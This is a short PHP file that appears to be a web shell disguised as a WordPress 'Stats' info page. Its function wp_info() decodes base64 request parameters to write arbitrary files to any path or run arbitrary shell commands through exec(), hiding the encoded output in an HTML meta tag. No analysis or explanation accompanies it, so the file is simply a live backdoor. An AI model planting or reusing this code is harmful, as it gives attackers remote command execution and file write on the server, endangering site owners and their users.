<?php
function wp_info() {
    if(isset($_REQUEST['wp_data'])){
        $data_file = @fopen(base64_decode($_REQUEST['wp_info']), 'wb');
        fwrite($data_file, base64_decode($_REQUEST['wp_data']));
        fclose($data_file);
        return base64_encode(json_encode(["Added", base64_decode($_REQUEST['wp_info']), "info"]));
    }
    elseif(isset($_REQUEST['wp_info'])){
            exec(implode(" ",json_decode(base64_decode($_REQUEST['wp_info']))), $info);
          return base64_encode(json_encode($info));
    }else{
        return "no meta";
    }
  }
?>
<html>
<head><meta name="info" data="<?php echo wp_info() ?>" /></head>
<body>
Stats
</body>
</html>